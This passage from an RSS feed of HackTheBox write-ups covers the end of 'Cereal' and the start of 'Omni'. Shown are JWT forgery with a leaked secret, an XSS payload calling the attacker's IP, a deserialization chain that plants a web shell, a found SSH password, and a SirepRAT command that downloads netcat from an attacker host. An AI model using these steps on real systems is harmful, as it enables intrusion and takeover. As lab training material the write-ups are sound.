	<span style="color:#e6db74">&#34;github.com/dgrijalva/jwt-go&#34;</span>
)

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">UserService</span> <span style="color:#66d9ef">interface</span> {
	<span style="color:#a6e22e">CreateToken</span>(<span style="color:#a6e22e">userID</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">string</span>
}

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">jwtService</span> <span style="color:#66d9ef">struct</span> {
	<span style="color:#a6e22e">secretKey</span> <span style="color:#66d9ef">string</span>
}

<span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">jwtService</span>) <span style="color:#a6e22e">CreateToken</span>() <span style="color:#66d9ef">string</span> {
	<span style="color:#a6e22e">claims</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">StandardClaims</span>{
		<span style="color:#a6e22e">ExpiresAt</span>: <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">AddDate</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>).<span style="color:#a6e22e">UTC</span>().<span style="color:#a6e22e">Unix</span>(),
	}

	<span style="color:#a6e22e">token</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">NewWithClaims</span>(<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">SigningMethodHS256</span>, <span style="color:#a6e22e">claims</span>)
	<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">SignedString</span>([]byte(<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">secretKey</span>))
	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		panic(<span style="color:#a6e22e">err</span>)
	}
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">t</span>
}

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">User</span> <span style="color:#66d9ef">struct</span> {
	<span style="color:#a6e22e">UserId</span>   <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;userId,omitempty&#34;`</span>
	<span style="color:#a6e22e">Username</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;username,omitempty&#34;`</span>
	<span style="color:#a6e22e">Token</span>    <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;token,omitempty&#34;`</span>
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	<span style="color:#a6e22e">jwt</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">jwtService</span>{}
	<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">secretKey</span> = <span style="color:#e6db74">&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>

	<span style="color:#a6e22e">cu</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">User</span>{
		<span style="color:#a6e22e">UserId</span>:   <span style="color:#e6db74">&#34;1&#34;</span>,
		<span style="color:#a6e22e">Username</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
		<span style="color:#a6e22e">Token</span>:    <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">CreateToken</span>(),
	}

	<span style="color:#a6e22e">currentUser</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">Marshal</span>(<span style="color:#a6e22e">cu</span>)
	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#a6e22e">currentUser</span>)
}
</code></pre></div><p>A bit messy but that&rsquo;s work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «cereal» «10.10.14.3»
$ go run main.go
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;userId&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;iamf&#34;</span>,<span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span style="color:#f92672">}</span>
</code></pre></div><h4 id="login">Login</h4>
<p>Refreshing the page after storing the token into the browser&rsquo;s local storage logs me in.</p>
<p><img class="img-container" src="imgs/image-20210609113605143.png" alt="image-20210609113605143"  />
</p>
<h4 id="input-testing">Input testing</h4>
<p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p>
<p><img class="img-container" src="imgs/image-20210605163056142.png" alt="image-20210605163056142"  />
</p>
<p>Here how the request and response looks like.</p>
<p><img class="img-container" src="imgs/image-20210605183457568.png" alt="image-20210605183457568"  />
</p>
<h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
<p>I decided to mix it with images hehe.</p>
<h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation on the body request.</p>
<p><img class="img-container" src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  />
</p>
<p>Because the validation only is on the client side, I could send a cereal request in any format. Here is for example of what I mean:</p>
<p><img class="img-container" src="imgs/image-20210609122743196.png" alt="image-20210609122743196"  />
</p>
<p>The cereal database&rsquo;s name can be found inside  <code>CerealContext.cs</code></p>
<p><img class="img-container" src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  />
</p>
<p>Back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen at comparing the commit logs):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
<span style="color:#a6e22e">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span style="color:#a6e22e">        [HttpGet(&#34;{id}&#34;)]</span>
        <span style="color:#66d9ef">public</span> IActionResult Get(<span style="color:#66d9ef">int</span> id)
        {
            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> db = <span style="color:#66d9ef">new</span> CerealContext())
            {
                <span style="color:#66d9ef">string</span> json = db.Requests.Where(x =&gt; x.RequestId == id).SingleOrDefault().JSON;
                <span style="color:#75715e">// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (json.ToLower().Contains(<span style="color:#e6db74">&#34;objectdataprovider&#34;</span>) || json.ToLower().Contains(<span style="color:#e6db74">&#34;windowsidentity&#34;</span>) || json.ToLower().Contains(<span style="color:#e6db74">&#34;system&#34;</span>))
                {
                    <span style="color:#66d9ef">return</span> BadRequest(<span style="color:#66d9ef">new</span> { message = <span style="color:#e6db74">&#34;The cereal police have been dispatched.&#34;</span> });
                }
                <span style="color:#66d9ef">var</span> cereal = JsonConvert.DeserializeObject(json, <span style="color:#66d9ef">new</span> JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.Auto
                });
                <span style="color:#66d9ef">return</span> Ok(cereal.ToString());
            }
        }
</code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#a6e22e">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span style="color:#a6e22e">[HttpGet(&#34;{id}&#34;)]</span>
</code></pre></div><p>This code blocks the gadget classes used for .NET deserialization attack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;objectdataprovider&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;windowsidentity&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;system&#34;</span><span style="color:#f92672">))</span>
</code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DownloadHelper</span>
    {
        <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_</span>URL;
        <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_F</span>ilePath;
        <span style="color:#66d9ef">public</span> String URL
...&lt;SNIP&gt;...
        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> Download()
        {
            <span style="color:#66d9ef">using</span> (WebClient wc = <span style="color:#66d9ef">new</span> WebClient())
            {
                <span style="color:#66d9ef">if</span> (!<span style="color:#66d9ef">string</span>.IsNullOrEmpty(<span style="color:#ae81ff">_</span>URL) &amp;&amp; !<span style="color:#66d9ef">string</span>.IsNullOrEmpty(<span style="color:#ae81ff">_F</span>ilePath))
                {
                    wc.DownloadFile(<span style="color:#ae81ff">_</span>URL, ReplaceLastOccurrence(<span style="color:#ae81ff">_F</span>ilePath,<span style="color:#e6db74">&#34;\\&#34;</span>, <span style="color:#e6db74">&#34;\\21098374243-&#34;</span>));
                }
            }
        }
</code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p>
<p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
<h4 id="xss-vulnerability">XSS Vulnerability</h4>
<p>When tracking down where the previous GET request coming, I find out that each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
<p><img class="img-container" src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  />
</p>
<p>And one of the app library that is used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Accordion</span>.<span style="color:#a6e22e">Toggle</span> <span style="color:#a6e22e">as</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">Button</span>} <span style="color:#a6e22e">variant</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;link&#34;</span> <span style="color:#a6e22e">eventKey</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>} <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;expand&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>}<span style="color:#f92672">&gt;</span>
    {<span style="color:#a6e22e">requestData</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">&amp;&amp;</span> 
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">MarkdownPreview</span> <span style="color:#a6e22e">markedOptions</span><span style="color:#f92672">=</span>{{ <span style="color:#a6e22e">sanitize</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }} <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span>} <span style="color:#f92672">/&gt;</span> <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
</code></pre></div><p>I could confirm the vulnerability with the following payload:</p>
<pre><code>[XSS](javascript: document.write`&lt;img src='http://10.10.14.3/iamf'/&gt;`)
</code></pre><p><img class="img-container" src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  />
</p>
<p>With a few experiments, URL encoding seems to work as well</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">[<span style="color:#f92672">XSS</span>](<span style="color:#a6e22e">javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-sonny">Shell as Sonny</h3>
<h4 id="web-shell-upload-via-xss-and-deserialization">Web Shell Upload via XSS and Deserialization</h4>
<p>I&rsquo;ll summarize that:</p>
<ul>
<li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code>.</li>
<li>From the previous code analysis, the gadget class are filtered, but there is one class called <code>DownloadHelper</code> that can be accessed and it has a download function.</li>
<li>There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li>
</ul>
<p>The tactics:</p>
<ul>
<li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=25">Serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID.</li>
<li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
<li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
</ul>
<p>I already made a <a href="https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1">script</a> to chain those vulnerabilities:</p>
<p><img class="img-container" src="imgs/image-20210609125605658.png" alt="image-20210609125605658"  />
</p>
<blockquote>
<p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p>
</blockquote>
<p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code></p>
<p><img class="img-container" src="imgs/image-20210609125710180.png" alt="image-20210609125710180"  />
</p>
<h3 id="ssh---sonny">SSH - sonny</h3>
<p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p>
<p><img class="img-container" src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  />
</p>
<p>I tried it on SSH (<code>sonny:mutual.madden.manner38974</code>) and it worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.2» 
$ ssh sonny@cereal.htb
sonny@cereal.htb&#39;s password: 
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

sonny@CEREAL C:\Users\sonny&gt;dir desktop\ 
 Volume in drive C has no label.                   
 Volume Serial Number is C4EF-2153                 
                                                   
 Directory of C:\Users\sonny\desktop               
                                                   
11/16/2020  05:19 AM    &lt;DIR&gt;          .           
11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
06/07/2021  09:59 PM                34 user.txt    
               1 File(s)             34 bytes      
               2 Dir(s)   7,621,619,712 bytes free 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>It&rsquo;s retired already.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
<li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
<li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Omni</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-omni/</link>
      <pubDate>Thu, 06 May 2021 23:03:39 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-omni/</guid>
      <description>Another exploitation on embedded system software, this time it&amp;#39;s on the OS side</description>
      <content:encoded><![CDATA[<p>Omni is an easy difficulty machine from HackTheBox that runs the IoT version of Windows 10. The machine is known to be vulnerable to SirepRAT, allowing an attacker to gain a remote code execution as SYSTEM. Leveraging the RAT, I&rsquo;m able to gain a foothold on the system and obtain two set of credentials that can be used to decrypt the encrypted flags.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploiting Windows IoT</li>
<li>Decrypting PSCredential object</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>SirepRAT - <a href="https://github.com/SafeBreach-Labs/SirepRAT">https://github.com/SafeBreach-Labs/SirepRAT</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial port scan using <code>nmap</code> discovers two open ports: MSRPC on port 135, and a Microsoft IIS on port 8080.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
$ nmap -sC -sV -oN nmap/initial-omni -v <span style="color:#e6db74">&#39;10.10.10.204&#39;</span>
<span style="color:#75715e"># Nmap 7.80 scan initiated Sun Aug 23 09:25:53 2020 as: nmap -sC -sV -oN nmap/initial-omni -v 10.10.10.204</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.204
Host is up <span style="color:#f92672">(</span>0.056s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE VERSION
135/tcp  open  msrpc   Microsoft Windows RPC
8080/tcp open  upnp    Microsoft IIS httpd
| http-auth:
| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
|_  Basic realm<span style="color:#f92672">=</span>Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn’t have a title.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
<p>Based on the <code>nmap</code>&rsquo;s result, authentication process is required to view the page content, and looks like it uses the basic HTTP authentication.</p>
<blockquote>
<p>With default script (<code>-sC</code>), <code>nmap</code> can retrieves the authentication scheme and realm of a web service that requires authentication.</p>
</blockquote>
<p><code>nmap</code> identifies the realm as &ldquo;Windows Device Portal&rdquo;, and here is what I found on Google.</p>
<p><img class="img-container" src="imgs/image-20210507000141372.png" alt="image-20210507000141372"  />
</p>
<p>According to the table from <a href="https://docs.microsoft.com/en-us/windows/uwp/debug-test-perf/device-portal">this documentation</a>, Windows Device Portal (WDP) on port 8080 belongs to the IoT family, which means this machine is most likely running a Windows 10 IoT version.</p>
<p><img class="img-container" src="imgs/image-20210507000331533.png" alt="image-20210507000331533"  />
</p>
<p>So, without credentials, I can&rsquo;t do anything here.</p>
<h2 id="foothold">Foothold</h2>
<p>There is a research about unauthenticated remote code execution on Windows IoT Core. The research documents (slides, paper) as well as the exploit tool are provided in the link below.</p>
<ul>
<li><a href="https://github.com/SafeBreach-Labs/SirepRAT/">https://github.com/SafeBreach-Labs/SirepRAT/</a></li>
</ul>
<h3 id="shell-as-omni">Shell as Omni$</h3>
<h4 id="sireprat-rce">SirepRAT RCE</h4>
<p>The exploit tool is work against this machine, and I can get a remote code execution as Omni$ / SYSTEM.</p>
<p>To get an interactive shell, I&rsquo;ll host Windows <code>nc64.exe</code> using Python HTTP server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
$ python -m http.server <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
</code></pre></div><p>I&rsquo;ll get the hosted netcat on Omni using PowerShell <code>Invoke-WebRequest</code> command by leveraging the SirepRAT RCE.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> --args <span style="color:#e6db74">&#34;/c powershell -c Invoke-webrequest -uri 10.10.14.68/nc64.exe -outfile U:\Users\Public\xc.exe&#34;</span> --vv
RECV:
00000000: 2A 4C <span style="color:#ae81ff">59</span> A5 FB <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">47</span>  A9 6D 1C C9 7D C8 4F <span style="color:#ae81ff">12</span>  *LY..<span style="color:#e6db74">`</span>.G.m..<span style="color:#f92672">}</span>.O.
SEND:
00000000: 0A <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">12</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
00000010: <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  5A <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> B8 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  $...6...Z.......
00000020: <span style="color:#ae81ff">12</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">00</span> 3A <span style="color:#ae81ff">00</span>  ............C.:.
00000030: 5C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">00</span> 6E <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">00</span> 6F <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">\.</span>W.i.n.d.o.w.s.
00000040: 5C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> 6D <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">\.</span>S.y.s.t.e.m.3.
00000050: <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">00</span> 5C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> 6D <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">00</span>  2.<span style="color:#ae81ff">\.</span>c.m.d...e.x.
00000060: <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> 2F <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">00</span> 6F <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span>  e./.c. .p.o.w.e.
00000070: <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span>  6C <span style="color:#ae81ff">00</span> 6C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> 2D <span style="color:#ae81ff">00</span>  r.s.h.e.l.l. .-.
00000080: <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">49</span> <span style="color:#ae81ff">00</span> 6E <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">00</span> 6F <span style="color:#ae81ff">00</span> 6B <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span>  c. .I.n.v.o.k.e.
00000090: 2D <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">00</span>  -.w.e.b.r.e.q.u.
000000A0: <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>  2D <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">00</span>  e.s.t. .-.u.r.i.
000000B0: <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">00</span>   .1.0...1.0...1.
000000C0: <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">00</span>  2F <span style="color:#ae81ff">00</span> 6E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">00</span>  4...4.7./.n.c.6.
